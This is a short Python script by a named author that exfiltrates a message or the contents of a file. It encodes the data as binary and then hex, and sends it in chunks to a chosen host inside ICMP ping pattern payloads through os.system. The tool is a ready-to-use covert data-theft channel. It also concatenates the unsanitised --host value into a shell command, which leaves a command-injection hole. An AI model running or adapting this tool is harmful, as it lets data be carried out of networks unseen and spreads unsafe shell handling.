#! /bin/usr/env python3
#
# Author: incidrthreat@gmail.com
#
# Purpose:  convert input (msg or file) to binary, convert binary to hex
#           split msg every 16 characters and add 2f '/' at the end.
#           Then it invokes the ping command to send the data to 
#           the provided host.
#

import binascii, os, argparse, time


def main():
    # argument pasring ->
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', type=str, help='Input a hostname/ip with surrounding quotes.  ei "127.0.0.1"', default="127.0.0.1")
    parser.add_argument('--file', type=argparse.FileType('r'), help='Input a msg file')
    parser.add_argument('--msg', type=str, help='Input the msg with surrounding quotes.  ei "SecretMsg"', default="SecretMsg")
    args = parser.parse_args()

    # global variables ->
    msg = []
    n = 16

    if args.file:
        data = str(args.file.readlines())
        data = data.lstrip("['").rstrip("']")
        binary = ''.join(format(ord(x), '08b') for x in data)

        for char in binary:
            hexed = str(binascii.hexlify(char.encode())).lstrip("b'").rstrip("'")
            msg.append(hexed)
        data = "".join(msg)
        hexdata = ([data[i:i+n]+"2f" for i in range(0, len(data), n)])
        for data in hexdata:
            # sample output = ping -c 1 -p 30313130303031312f 127.0.0.1
            os.system("ping -c 1 -p " + data + " " +args.host)
            time.sleep(.5)
    elif args.msg:
        binary = ''.join(format(ord(x), '08b') for x in args.msg)

        for char in binary:
            hexed = str(binascii.hexlify(char.encode())).lstrip("b'").rstrip("'")
            msg.append(hexed)
        data = "".join(msg)
        hexdata = ([data[i:i+n]+"2f" for i in range(0, len(data), n)])
        for data in hexdata:
            # sample output = ping -c 1 -p 30313130303031312f 127.0.0.1
            os.system("ping -c 1 -p " + data + " " +args.host)
            time.sleep(.5)

    print("\n\n\nMsg transmission complete\n\n\n")

if __name__ == "__main__":
    main()